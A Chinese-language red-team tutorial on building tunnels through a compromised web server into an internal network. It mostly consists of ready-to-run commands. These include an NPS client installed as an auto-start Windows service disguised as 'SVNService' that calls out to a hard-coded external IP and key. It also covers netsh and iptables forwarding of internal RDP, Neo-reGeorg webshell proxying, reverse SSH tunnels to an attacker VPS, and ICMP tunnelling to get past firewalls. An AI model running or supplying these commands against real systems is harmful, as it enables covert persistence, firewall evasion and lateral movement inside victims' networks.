---
title: 构建通道漫游内网
---
# 网络连通性测试

> 当我们千辛万苦通过外网边界的一个入口点拿到Webshell后，想要在内网横向拓展战果第一件事情就是要构建内网通道，构建通道的方法网上也有很多五花八门的方法有老到被杀软干掉的lcx还有配置复杂的FRP，本文是作者自己实战中觉得更加方便实用的一些方法。例如目标能出网时用的搭建和操作都极其简单的NPS（反向代理），以及目标不能出网时用的Neo-reGeorg（正向代理）

**ICMP**

```bash
ping 114.114.114.114 -n 1	#Windows
ping 114.114.114.114 -c 1	#Linux
```

**HTTP**

```bash
curl http://www.baidu.com
```

**DNS**

```bash
nslookup baidu.com
```

仅DNS出网可直接上CS-DNS上线

**读取本机代理**

```bash
REG QUERY "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
#查看代理配置情况,连接它的代理试试
```

**是否存在Nginx反向代理**

```bash
#1、找到Nginx目录
#2、查看配置文件
#3、例如某次实战中发现正反向都代理不出去，查看配置文件发现了nginx反代，直接连接公网IP代理的3389端口
```

# 反向代理

服务器能**出网**的情况下，反向代理可以穿透防火墙（需要上传文件）

> 1、CobaltStrike 自带的Socks代理
>
> 2、NPS（简单 自带Web管理页面、稳定跨平台、支持多级代理）

## 搭建NPS

1、下载nps服务端到自己的VPS（以Linux-Centos为例）https://ehang-io.github.io/nps

```bash
sudo ./nps install	#安装
sudo nps start		#启动
sudo nps stop		#停止
sudo nps reload		#服务端配置文件重载
```

2、修改配置文件（敏感信息改掉） `/etc/nps/conf/nps.conf`

| 名称           | 含义                                                         |
| -------------- | ------------------------------------------------------------ |
| web_port       | web管理端口                                                  |
| web_password   | web界面管理密码                                              |
| web_username   | web界面管理账号                                              |
| auth_key       | web api密钥                                                  |
| public_vkey    | 客户端以配置文件模式启动时的密钥，设置为空表示关闭客户端配置文件连接模式 |
| auth_crypt_key | 获取服务端authKey时的aes加密密钥，16位                       |

**创建系统服务**

```bash
sc create svnservice binpath= "C:\Users\Public\Videos\setup.exe -server=111.173.114.77:8091 -vkey=zkxcn35bhkzit2kt -type=tcp"  displayname= "SVNService" depend= Tcpip start= auto
```

```bash
sc start svnservice
```

# 正向转发

## Windows netsh 端口转发（双网卡用）

`netsh`仅支持TCP协议， 适用于**双网卡**服务器

连接外网6666端口，就是连接到内网目标上面的3389。 

**启动转发**

```bash
#查看现有规则
netsh interface portproxy show all

#添加转发规则
netsh interface portproxy set v4tov4 listenaddress=外网IP listenport=6666 connectaddress=内网IP connectport=3389
```

**取消转发**

```bash
#删除转发规则
netsh interface portproxy delete v4tov4 listenport=6666

#xp需要安装ipv6
netsh interface ipv6 install
```

## Linux iptables 端口转发（高权限用）

1、编辑配置文件

```bash
vi /etc/sysctl.conf
	net.ipv4.ip_forward = 1#开启IP转发
```

2、关闭服务

```bash
service iptables stop
```

3、配置规则

```bash
#需要访问的内网地址：10.1.1.11（Windows）
#内网边界web服务器：192.168.100.100（Linux）
iptables -t nat -A PREROUTING --dst 192.168.100.100 -p tcp --dport 3389 -j DNAT--to-destination 10.1.1.11:3389

iptables -t nat -A POSTROUTING --dst 10.1.1.11 -p tcp --dport 3389 -j SNAT --to-source 192.168.100.100
```

4、保存并重启服务

```bash
service iptables save && service iptables start
```

这时访问Web服务器的3389就能登录到内网机器的桌面了。

## Neo-reGeorg 端口复用

配合Webshell，复用目标的Web服务端口开一个Socks5代理隧道。

https://github.com/L-codes/Neo-reGeorg

```bash
python3 neoreg.py generate -k password					#生成服务端
python3 neoreg.py -k password -u http://xx/tunnel.php	#在本地建立Socks5代理
```

# Linux SSH隧道（高权限用）

SSH一般是允许通过防火墙的，而且传输过程是加密的 

**本地转发（正向）**

在`中转VPS`上执行以下命令

```bash
ssh -CfNg -L <VPS监听端口>:<目标内网IP>:<目标端口> <（root@目标外网Web服务器，会要求输入密码）>

ssh -CfNg -L 8080:10.1.1.3:3389 root@100.100.1.100

#VPS上查看8090端口是否已经连接
netstat -tulnp | grep "8090"

#连接目标内网服务器的远程桌面
VPS-IP:8090
```

SSH进程的本地端口映射，将本地端口转发到远端指定机器的指定端口；

在本地监听一个端口，所有访问这个端口的流量都会通过SSH隧道传输到远端的对应端口。

**远程转发（反向）**

 在`Web服务器`上执行如下命令 

```bash
ssh -CfNg -R <VPS的端口>:<目标内网IP>:<目标端口> <（root@VPS-IP，会要求输入密码）>

ssh -CfNg -R 8090:10.1.1.3:3389 root@192.168.0.1
```

访问`VPS`的8090端口，即可连接内网数据库服务器的3389

```bash
VPS-IP:8090
```

所有访问`VPS`的8090端口的流量都会通过SSH隧道传输到数据库服务器的3389端口

# ICMP加密隧道

适用场景 ：特殊环境下`ICMP`流量允许出网，穿透防火墙

工具：[icmptunnel](https://github.com/jamesbarlow/icmptunnel) （只能在Linux上使用）

**安装服务端**

```bash
git clone https://github.com/jamesbarlow/icmptunnel.git
cd icmptunnel/
make
sysctl -w net.ipv4.icmp_echo_ignore_all=1	#禁用自带的ICMP，两端都要
./icmptunnel -s 							#服务端以root用户监听
(ctrl-z)									
bg											#后台挂起
ifconfig tun0 10.0.0.1 netmask 255.255.255.0#给隧道接口分配一个 IP 地址
```

**客户端连接**

```bash
./icmptunnel <server-IP>
(ctrl-z)
bg											#后台挂起
ifconfig tun0 10.0.0.2 netmask 255.255.255.0#给隧道接口分配一个 IP 地址
```

 现在，我们拥有一个端到端基于 ICMP 数据包的隧道，测试SSH连接

```bash
ssh root@10.0.0.1
```

当然也可以把远程服务器当作一个加密的 SOCKS 代理：

```bash
ssh -D 8080 -N root@10.0.0.1
```

浏览器设置代理 socks://10.0.0.1:8080

# 边界代理

**遵循三个原则**

1. **稳定性**（主要用于扫描）{ 支持高并发、自动断线重连 }
2. **安全性**（防止socks5直接被ban）{ 流量可加密、开放代理可设置认证 }
3. **健壮性**   { 支持多种协议方式、最好支持插件定制 }

**Windows连接**

Proxifier全局代理（[狼盘下载](https://pan.wgpsec.org)）

**Linux连接**

使用[proxychains](https://github.com/rofl0r/proxychains-ng)，配合MSF使用